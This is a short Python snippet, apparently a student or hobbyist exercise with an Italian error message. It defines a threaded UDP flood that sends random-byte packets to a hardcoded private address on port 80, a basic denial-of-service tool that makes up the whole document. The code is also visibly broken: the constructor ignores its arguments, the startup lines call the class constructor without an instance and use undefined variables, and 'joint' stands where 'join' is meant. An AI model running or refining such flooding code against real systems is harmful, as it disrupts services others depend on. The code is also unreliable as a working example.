class udpFlood(threading.Thread):
        def __init__(self, ip, port, size, packets):
                self.ip = "192.168.32.100"
                self.port = 80
                self.size = 1000
                self.packets = 1000
                self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

        def run(self):
            for i in range(self.packets):
                try:
                   bytes_data = random._urandom(self.size)
                   if self.port == 0:
                       self.port = random.randrange(1, 65535)
                   self.udp.sendto(bytes_data,(self.ip, self.port))
                except Exception as e:
                     print(f"errore invio pacchetto: {e}")

main = udpFlood.__init__(ip, port, size, packets)
main.start()
main.joint()
